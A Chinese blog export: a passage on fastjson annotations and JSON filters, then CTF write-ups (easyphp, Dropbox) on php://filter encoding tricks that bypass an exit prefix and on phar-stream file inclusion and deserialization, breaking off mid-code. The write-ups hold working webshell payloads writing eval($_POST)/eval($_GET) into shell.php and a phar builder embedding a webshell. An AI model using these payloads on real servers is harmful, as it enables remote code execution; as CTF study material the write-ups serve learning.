<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONField &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ordinal</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">format</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">serialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">	<span class="comment">//注意这里，反序列化！</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    SerializerFeature[] serialzeFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Feature[] parseFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">label</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">jsonDirect</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; serializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; deserializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    String[] alternateNames() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">unwrapped</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">defaultValue</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><p>FieldInfo 可以配置在 getter/setter 方法或者字段上。例如：</p>
<h3 id="配置在-getter-setter-上"><a href="#配置在-getter-setter-上" class="headerlink" title="配置在 getter/setter 上"></a>配置在 getter/setter 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"> </span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置在-field-上"><a href="#配置在-field-上" class="headerlink" title="配置在 field 上"></a>配置在 field 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">     <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="创建-JSON-对象"><a href="#创建-JSON-对象" class="headerlink" title="创建 JSON 对象"></a>创建 JSON 对象</h2><p>创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。</p>
<p>虽然JSONArryay也可以创建一个JSON对象，但我觉得书写方式不够美观，其中如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-字符串转换为-Java-对象"><a href="#JSON-字符串转换为-Java-对象" class="headerlink" title="JSON 字符串转换为 Java 对象"></a>JSON 字符串转换为 Java 对象</h2><p>fastjson允许我们可以将前端传来的数据转换变成JSON数据，同样的也允许我们把后端数据转换为JSON字符串丢给前端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsonToJava</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JavaToJson miaomiaomiao = <span class="keyword">new</span> JavaToJson(<span class="number">21</span>, <span class="string">&quot;miaomiaomiao&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        String jsonObject = JSON.toJSONString(miaomiaomiao);</span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        这前面的part我们将数据转换成了JSON数据</span></span><br><span class="line">        JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);</span><br><span class="line"><span class="comment">//        指定需要转换的JSON字符串，并且指定原型,这样的话一个JAVA对象就指定好了</span></span><br><span class="line">        System.out.println(newJavaObject.getAge());</span><br><span class="line">        System.out.println(newJavaObject.getFullName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用ContextValuFilter配置JSON转换"><a href="#使用ContextValuFilter配置JSON转换" class="headerlink" title="使用ContextValuFilter配置JSON转换"></a>使用ContextValuFilter配置JSON转换</h3><p>在有些场景中，对Value做过滤，需要获得所述JavaBean的信息，而我们可能想要过滤某些信息，便可以使用该方法进行操作了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">31</span>,<span class="string">&quot;wdnmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">33</span>,<span class="string">&quot;wd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">givenContextFilter_whenJavaObject_thanJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      ContextValueFilter valueFilter = <span class="keyword">new</span> ContextValueFilter () &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                  BeanContext context, Object object, String name, Object value)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (name.equals(<span class="string">&quot;DATE OF BIRTH&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&quot;NOT TO DISCLOSE&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (value.equals(<span class="string">&quot;wdnmd&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> ((String) value).toUpperCase();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      String jsonOutput = JSON.toJSONString(listOfJava, valueFilter);</span><br><span class="line">      System.out.println(jsonOutput);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>经过上述代码的操作，我们的时间将会修改为NOT TO DISCLOSE，并且数据中不包含wdnmd的将会被过滤,具体输出如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span>,<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wdnmd&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>全国工控2020-web-easyphp</title>
    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
    <content><![CDATA[<h1 id="全国工控2020-web-easyphp"><a href="#全国工控2020-web-easyphp" class="headerlink" title="全国工控2020-web-easyphp"></a>全国工控2020-web-easyphp</h1><h2 id="1-从伪协议开始说起"><a href="#1-从伪协议开始说起" class="headerlink" title="1.从伪协议开始说起"></a>1.从伪协议开始说起</h2><p>php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流，</p>
<p>在之前三个白帽中有一个比赛，其中一部分的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>

<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。</p>
<p>但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去，</p>
<p>当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为：</p>
<p>phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用：</p>
<p>官网：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器</span><br></pre></td></tr></table></figure>

<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到php为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>成功！除此之外，还补充一种骚思路：</p>
<h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3.iconv字符编码转换"></a>3.iconv字符编码转换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>

<p>根据大佬给出的UCS2-2 编码的方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可，</p>
<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>写入shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>4.组合使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>还可以尝试使用srtip_tags+base64的方式进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。</p>
<p>讲完上面的，再回到wmctf的check in2，题目的源码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>除此之外，还有二次编码绕过的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p> 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>华北赛区Dropbox</title>
    <url>/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/</url>
    <content><![CDATA[<h1 id="1-知识点学习"><a href="#1-知识点学习" class="headerlink" title="1.知识点学习"></a>1.知识点学习</h1><h2 id="1-1-phar流"><a href="#1-1-phar流" class="headerlink" title="1.1 phar流"></a>1.1 phar流</h2><p>自PHP5.3.0开始，php便支持该数据流</p>
<table>
<thead>
<tr>
<th>支持allow_url_fopen</th>
<th>no</th>
</tr>
</thead>
<tbody><tr>
<td>支持allow_url_include</td>
<td>No</td>
</tr>
<tr>
<td>允许读取</td>
<td>Yes</td>
</tr>
<tr>
<td>允许写入</td>
<td>Yes</td>
</tr>
</tbody></table>
<p>在PHP的官网手册当中，该流用于解压phar文件，我们允许利用该流直接读取被压缩的phar文件，但是我们实战中却发现，该流允许我们读取任意一个文件，只要他们是经过压缩的文件，PHP会自动的解压文件，并且读取里面的PHP。</p>
<p>phar的参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701</span><br></pre></td></tr></table></figure>

<p>（感觉PHP有点垃圾..使用Phar文件，但是却完全没有任何的过滤，他将识别任何模块的后缀，直接将其解压，之后读取其中的PHP文件</p>
<p>例如我们构造一个test.php，我们将其压缩成test.zip，之后修改zip后缀为jpg，他还是会能够识别，并且读取其中的文件</p>
<h3 id="1-1-1-phar写🐎文件包含"><a href="#1-1-1-phar写🐎文件包含" class="headerlink" title="1.1.1 phar写🐎文件包含"></a>1.1.1 phar写🐎文件包含</h3><p>测试的代码如下：</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//phar://./test.jpg/test.php</span></span><br><span class="line"><span class="keyword">include</span>($_POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以利用如下代码生成一个phar文件，并且生成🐎</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[123]); ?&gt;&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用如下：</p>
<p><img src="image-20201029135915083.png" alt="image-20201029135915083"></p>
<h3 id="1-1-2-phar反序列化"><a href="#1-1-2-phar反序列化" class="headerlink" title="1.1.2 phar反序列化"></a>1.1.2 phar反序列化</h3><p>在以前的大部分事件，我们都是利用反序列化的函数，但是人们现在安全意识越来越高之后，这种利用方式越来越难。</p>
<p>但是Phar://读取文件phar的时候，会反序列化meta-data储存的信息</p>
<p>Phar文件的一个标准特征如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;</span></span><br><span class="line"><span class="comment"> O:10:&quot;TestObject&quot;:0:&#123;&#125;   test.tx   GBMB</span></span><br></pre></td></tr></table></figure>

<p>我们可以发现Meta-data的内容就是以反序列化的形式储存的，利用Phar协议解析的时候都会反序列化，同时文件操作函数一般都能用伪协议流，所以Phar://的供给面还是相当广的。</p>
<p>所以满足如下条件的时候该类型序列化可以使用：</p>
<ul>
<li>可以上传Phar文件(或者文件自己使用Phar读取)</li>
<li>具有可利用的魔术方法</li>
<li>文件操作函数的参数可用</li>
</ul>
<p>例题：[SWPUCTF 2018]SimplePHP</p>
<p>首先就尝试读取一波文件file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>Class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span 